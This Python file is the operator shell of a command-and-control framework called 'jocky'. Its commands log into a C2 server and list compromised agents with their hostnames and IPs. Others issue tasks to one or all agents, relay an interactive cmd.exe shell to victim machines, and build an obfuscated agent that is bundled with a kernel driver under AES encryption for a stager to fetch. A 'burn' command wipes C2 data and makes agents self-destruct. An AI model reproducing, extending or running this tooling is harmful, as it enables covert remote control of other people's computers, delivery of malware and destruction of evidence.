import argparse
import cmd
import json
import shlex
import time
from pathlib import Path

from . import config as client_config
from .api import ApiClient
from .banner import BANNER
from .c2_api import C2ApiClient

POLL_INTERVAL_SECONDS = 0.4


def _split(arg: str) -> list:
    """shlex.split that survives Windows backslash paths."""
    return shlex.split(arg.replace("\\", "/"))


class ArgParseExit(Exception):
    pass


class _Parser(argparse.ArgumentParser):
    """argparse exits the process on bad args by default; raise instead so the shell survives."""

    def error(self, message: str) -> None:
        print(f"error: {message}")
        raise ArgParseExit(message)


class JockyShell(cmd.Cmd):
    intro = BANNER
    prompt = "jocky > "

    def __init__(self) -> None:
        super().__init__()
        self.addr: str | None = None
        self.token: str | None = None
        self.c2_addr: str | None = None
        self.c2_client: C2ApiClient | None = None

        # Restore persisted sessions on start.
        saved = client_config.load()
        if saved:
            if saved.get("addr") and saved.get("token"):
                self.addr  = saved["addr"]
                self.token = saved["token"]
                print(f"[*] Restored build-server session: {self.addr}")
            if saved.get("c2_addr") and saved.get("c2_jwt"):
                self.c2_addr   = saved["c2_addr"]
                self.c2_client = C2ApiClient(saved["c2_addr"], saved["c2_jwt"])
                print(f"[*] Restored C2 session: {self.c2_addr}")

    # ── Internal helpers ──────────────────────────────────────────────

    @property
    def connected(self) -> bool:
        return self.addr is not None and self.token is not None

    def _require_connected(self) -> bool:
        if not self.connected:
            print("not connected — run `connect --addr <ip:port> --token <token>` first")
            return False
        return True

    def _require_c2(self) -> bool:
        if self.c2_client is None:
            print("not connected to C2 — run `c2connect --addr <ip:port> --user <u> --pass <p>` first")
            return False
        return True

    # ── Build-server commands (existing) ─────────────────────────────

    def do_connect(self, arg: str) -> None:
        "connect --addr <ip:port> --token <token> : authenticate and link this shell to a jocky build server"
        parser = _Parser(prog="connect", add_help=False)
        parser.add_argument("--addr",  required=True)
        parser.add_argument("--token", required=True)
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        client = ApiClient(args.addr, args.token)
        try:
            result = client.connect()
        except Exception as exc:
            print(f"connect failed: {exc}")
            return

        self.addr  = args.addr
        self.token = args.token
        client_config.save(args.addr, args.token)
        print(f"connected to {args.addr} as {result['client_name']}")

    def do_build(self, arg: str) -> None:
        "build --template <path> --output <name> --passes <passes> : upload a .cpp file and stream compile logs"
        if not self._require_connected():
            return

        parser = _Parser(prog="build", add_help=False)
        parser.add_argument("--template", required=True)
        parser.add_argument("--output",   required=True)
        parser.add_argument("--passes",   default="")
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        source_path = Path(args.template)
        if not source_path.is_file():
            print(f"template not found: {source_path}")
            return

        client = ApiClient(self.addr, self.token)
        try:
            build_id = client.submit_build(source_path, args.output, args.passes)
        except Exception as exc:
            print(f"build submission failed: {exc}")
            return

        print(f"build {build_id} submitted, polling for logs...")
        self._poll_build(client, build_id)

    def _poll_build(self, client: ApiClient, build_id: str) -> str | None:
        """Stream build logs until completion. Returns build_id on success, None on failure."""
        offset = 0
        while True:
            try:
                data = client.poll_build_logs(build_id, offset)
            except Exception as exc:
                print(f"log poll failed: {exc}")
                return None

            for line in data["lines"]:
                print(f"[compiler] {line}")
            offset = data["next_offset"]

            status = data["status"]
            if status in ("success", "failed"):
                exit_code = data["exit_code"]
                if status == "success":
                    print(f"BUILD SUCCEEDED (exit {exit_code})")
                    return build_id
                else:
                    print(f"BUILD FAILED (exit {exit_code})")
                    return None

            time.sleep(POLL_INTERVAL_SECONDS)

    def do_sessions(self, arg: str) -> None:
        "sessions : list past builds"
        self._print_sessions()

    def do_history(self, arg: str) -> None:
        "history : alias for sessions"
        self._print_sessions()

    def _print_sessions(self) -> None:
        if not self._require_connected():
            return
        client = ApiClient(self.addr, self.token)
        try:
            rows = client.sessions()
        except Exception as exc:
            print(f"failed to fetch sessions: {exc}")
            return

        if not rows:
            print("no builds yet")
            return

        print(f"{'ID':<34} {'FILE':<20} {'OUTPUT':<16} {'STATUS':<8} {'EXIT':<5} CREATED")
        for row in rows:
            exit_code = row["exit_code"]
            print(
                f"{row['id']:<34} {row['filename']:<20} {row['output_name']:<16} "
                f"{row['status']:<8} {'' if exit_code is None else exit_code:<5} {row['created_at']}"
            )

    # ── C2 commands ───────────────────────────────────────────────────

    def do_c2connect(self, arg: str) -> None:
        "c2connect --addr <ip:port> --user <username> --pass <password> : login to JOCKY C2 server"
        parser = _Parser(prog="c2connect", add_help=False)
        parser.add_argument("--addr", required=True)
        parser.add_argument("--user", required=True)
        parser.add_argument("--pass", dest="password", required=True)
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        try:
            client = C2ApiClient.login(args.addr, args.user, args.password)
        except Exception as exc:
            print(f"C2 login failed: {exc}")
            return

        self.c2_addr   = args.addr
        self.c2_client = client
        client_config.save_c2(args.addr, client.jwt)
        print(f"[+] connected to C2 at {args.addr}")

    def do_targets(self, arg: str) -> None:
        "targets [--limit N] : list all registered agents"
        if not self._require_c2():
            return

        parser = _Parser(prog="targets", add_help=False)
        parser.add_argument("--limit", type=int, default=100)
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        try:
            agents = self.c2_client.list_agents(args.limit)
        except Exception as exc:
            print(f"failed to list agents: {exc}")
            return

        if not agents:
            print("no agents registered")
            return

        print(f"{'AGENT_ID':<38} {'HOSTNAME':<22} {'IP':<16} {'STATUS':<8} LAST_SEEN")
        for a in agents:
            print(
                f"{a.get('agent_id',''):<38} {a.get('hostname',''):<22} "
                f"{a.get('ip_address',''):<16} {a.get('status',''):<8} {a.get('last_seen','')}"
            )

    def do_task(self, arg: str) -> None:
        "task --agent <id|all> --cmd <type> [--data <json>] : issue a task to one or all agents"
        if not self._require_c2():
            return

        parser = _Parser(prog="task", add_help=False)
        parser.add_argument("--agent", required=True)
        parser.add_argument("--cmd",   required=True)
        parser.add_argument("--data",  default="{}")
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        try:
            payload = json.loads(args.data)
        except json.JSONDecodeError as exc:
            print(f"invalid --data JSON: {exc}")
            return

        targets: list[str] = []
        if args.agent == "all":
            try:
                agents  = self.c2_client.list_agents()
                targets = [a["agent_id"] for a in agents if a.get("status") == "online"]
            except Exception as exc:
                print(f"failed to list agents: {exc}")
                return
            if not targets:
                print("no online agents")
                return
        else:
            targets = [args.agent]

        for agent_id in targets:
            try:
                result = self.c2_client.create_task(agent_id, args.cmd, payload)
                print(f"[+] {agent_id[:8]}…  task_id={result.get('task_id','?')[:8]}…  cmd={args.cmd}")
            except Exception as exc:
                print(f"[-] {agent_id[:8]}…  failed: {exc}")

    def do_tasks(self, arg: str) -> None:
        "tasks --agent <id> [--limit N] : list task history for an agent"
        if not self._require_c2():
            return

        parser = _Parser(prog="tasks", add_help=False)
        parser.add_argument("--agent", required=True)
        parser.add_argument("--limit", type=int, default=20)
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        try:
            tasks = self.c2_client.list_tasks(args.agent, args.limit)
        except Exception as exc:
            print(f"failed to list tasks: {exc}")
            return

        if not tasks:
            print("no tasks")
            return

        print(f"{'TASK_ID':<38} {'CMD':<14} {'STATUS':<10} CREATED")
        for t in tasks:
            print(
                f"{t.get('task_id',''):<38} {t.get('command_type',''):<14} "
                f"{t.get('status',''):<10} {t.get('created_at','')}"
            )

    def do_telemetry(self, arg: str) -> None:
        "telemetry --agent <id> [--limit N] : view telemetry logs for an agent"
        if not self._require_c2():
            return

        parser = _Parser(prog="telemetry", add_help=False)
        parser.add_argument("--agent", required=True)
        parser.add_argument("--limit", type=int, default=20)
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        try:
            logs = self.c2_client.list_telemetry(args.agent, args.limit)
        except Exception as exc:
            print(f"failed to list telemetry: {exc}")
            return

        if not logs:
            print("no telemetry")
            return

        for entry in logs:
            data = entry.get("result_data") or {}
            if isinstance(data, str):
                try:
                    data = json.loads(data)
                except json.JSONDecodeError:
                    pass
            print(f"[{entry.get('received_at','')}] {entry.get('log_type','')}  {json.dumps(data)}")

    def do_shell(self, arg: str) -> None:
        "shell --agent <id>  : interactive cmd.exe relay via task + telemetry (latency = poll interval)"
        if not self._require_c2():
            return

        parser = _Parser(prog="shell", add_help=False)
        parser.add_argument("--agent", required=True)
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        short = args.agent[:8]
        print(f"[*] shell relay → {short}…  (latency ≈ agent poll interval, default 30 s)")
        print(f"[*] type 'exit' or press Ctrl-C to return to jocky\n")

        while True:
            try:
                line = input(f"[{short}]> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] shell closed")
                break

            if not line:
                continue
            if line.lower() in ("exit", "quit"):
                print("[*] shell closed")
                break

            try:
                result = self.c2_client.create_task(args.agent, "shell", {"cmd": line})
            except Exception as exc:
                print(f"[-] task failed: {exc}")
                continue

            task_id = result.get("task_id", "")
            if not task_id:
                print("[-] no task_id returned")
                continue

            # Poll telemetry until the matching entry arrives (up to 60 s).
            output = None
            for _ in range(60):
                time.sleep(1)
                try:
                    logs = self.c2_client.list_telemetry(args.agent, limit=30)
                    for entry in logs:
                        if str(entry.get("task_id") or "").lower() != task_id.lower():
                            continue
                        raw = entry.get("result_data") or {}
                        if isinstance(raw, str):
                            try:
                                raw = json.loads(raw)
                            except json.JSONDecodeError:
                                pass
                        output = raw.get("output", "") if isinstance(raw, dict) else str(raw)
                        break
                except Exception:
                    pass
                if output is not None:
                    break

            if output is None:
                print("[-] timed out (60 s) — agent may not have picked up the task yet")
            else:
                print(output, end="" if output.endswith("\n") else "\n")

    def do_payload(self, arg: str) -> None:
        "payload upload --file <path> | payload status : manage the C2 payload"
        if not self._require_c2():
            return

        parts = _split(arg)
        if not parts:
            print("usage: payload upload --file <path>  |  payload status")
            return
        sub = parts[0]

        if sub == "status":
            try:
                info = self.c2_client.payload_status()
                print(json.dumps(info, indent=2))
            except Exception as exc:
                print(f"failed: {exc}")

        elif sub == "upload":
            parser = _Parser(prog="payload upload", add_help=False)
            parser.add_argument("--file", required=True)
            try:
                args = parser.parse_args(parts[1:])
            except ArgParseExit:
                return
            p = Path(args.file)
            if not p.is_file():
                print(f"not found: {p}")
                return
            try:
                result = self.c2_client.upload_payload(p.read_bytes(), p.name)
                print(f"[+] payload uploaded: {result}")
            except Exception as exc:
                print(f"upload failed: {exc}")

        else:
            print(f"unknown subcommand '{sub}' — use upload or status")

    def do_bundle(self, arg: str) -> None:
        "bundle upload --file <path> : upload a pre-built bundle.bin to the C2"
        if not self._require_c2():
            return

        parts = _split(arg)
        if not parts or parts[0] != "upload":
            print("usage: bundle upload --file <path>")
            return

        parser = _Parser(prog="bundle upload", add_help=False)
        parser.add_argument("--file", required=True)
        try:
            args = parser.parse_args(parts[1:])
        except ArgParseExit:
            return

        p = Path(args.file)
        if not p.is_file():
            print(f"not found: {p}")
            return

        try:
            result = self.c2_client.upload_bundle(p.read_bytes())
            print(f"[+] bundle uploaded: {result.get('size', '?')} bytes")
        except Exception as exc:
            print(f"upload failed: {exc}")

    def do_deploy(self, arg: str) -> None:
        """deploy --template <path> --passes <p> --driver <path> [--agent-bin <path>] [--aes-key <hex>]
        Full pipeline: build payload via jocky server → download artifact →
        bundle with driver → upload bundle to C2."""
        if not self._require_connected():
            return
        if not self._require_c2():
            return

        parser = _Parser(prog="deploy", add_help=False)
        parser.add_argument("--template",  required=True)
        parser.add_argument("--passes",    default="")
        parser.add_argument("--driver",    required=True, help="path to driver.sys")
        parser.add_argument("--agent-bin", dest="agent_bin", default=None,
                            help="pre-built jocky_agent.exe (if omitted, uses built artifact)")
        parser.add_argument("--aes-key",   dest="aes_key", default=None,
                            help="64-char hex AES key (reads JOCKY_AES_KEY env var if omitted)")
        try:
            args = parser.parse_args(_split(arg))
        except ArgParseExit:
            return

        import os
        aes_key_hex = args.aes_key or os.environ.get("JOCKY_AES_KEY", "")
        if not aes_key_hex or len(aes_key_hex) != 64:
            print("[-] AES key not found — pass --aes-key or set JOCKY_AES_KEY env var")
            return

        driver_path = Path(args.driver)
        if not driver_path.is_file():
            print(f"[-] driver not found: {driver_path}")
            return

        source_path = Path(args.template)
        if not source_path.is_file():
            print(f"[-] template not found: {source_path}")
            return

        build_client = ApiClient(self.addr, self.token)

        # 1. Build via jocky server
        output_name = "jocky_agent.exe"
        print(f"[*] submitting build: {source_path.name} → {output_name}")
        try:
            build_id = build_client.submit_build(source_path, output_name, args.passes)
        except Exception as exc:
            print(f"[-] build submission failed: {exc}")
            return

        build_id = self._poll_build(build_client, build_id)
        if build_id is None:
            return

        # 2. Download the compiled artifact
        if args.agent_bin:
            print(f"[*] using pre-built agent: {args.agent_bin}")
            agent_bytes = Path(args.agent_bin).read_bytes()
        else:
            print(f"[*] downloading artifact {build_id[:8]}…")
            try:
                agent_bytes = build_client.download_artifact(build_id)
            except Exception as exc:
                print(f"[-] artifact download failed: {exc}")
                return
            print(f"[+] artifact downloaded: {len(agent_bytes):,} bytes")

        # 3. Build JCKY bundle in memory
        print("[*] building JCKY bundle…")
        try:
            from .bundle_builder import build_bundle
            bundle_bytes = build_bundle(
                driver_path.read_bytes(), agent_bytes, bytes.fromhex(aes_key_hex)
            )
        except ImportError:
            print("[-] pycryptodome not installed — pip install pycryptodome")
            return
        except Exception as exc:
            print(f"[-] bundle build failed: {exc}")
            return
        print(f"[+] bundle built: {len(bundle_bytes):,} bytes")

        # 4. Upload bundle to C2
        print("[*] uploading bundle to C2…")
        try:
            result = self.c2_client.upload_bundle(bundle_bytes)
            print(f"[+] bundle uploaded to C2: {result.get('size', '?')} bytes")
        except Exception as exc:
            print(f"[-] bundle upload failed: {exc}")
            return

        print("[+] deploy complete — stager will fetch the new bundle on next run")

    def do_burn(self, arg: str) -> None:
        "burn [--confirm] : operator kill switch — wipe C2 data and push self_destruct to all online agents"
        if not self._require_c2():
            return

        if "--confirm" not in arg:
            print("[!] this will wipe all C2 payload data and terminate all online agents")
            print("[!] add --confirm to proceed")
            return

        try:
            result = self.c2_client.burn()
        except Exception as exc:
            print(f"[-] burn failed: {exc}")
            return

        notified = result.get("agents_notified", 0)
        print(f"[!] BURNED — {notified} agent(s) notified, C2 data purged")

    # ── Shell control ─────────────────────────────────────────────────

    def do_exit(self, arg: str) -> bool:
        "exit : quit the shell"
        print("bye")
        return True

    def do_quit(self, arg: str) -> bool:
        "quit : quit the shell"
        return self.do_exit(arg)

    def emptyline(self) -> None:
        pass
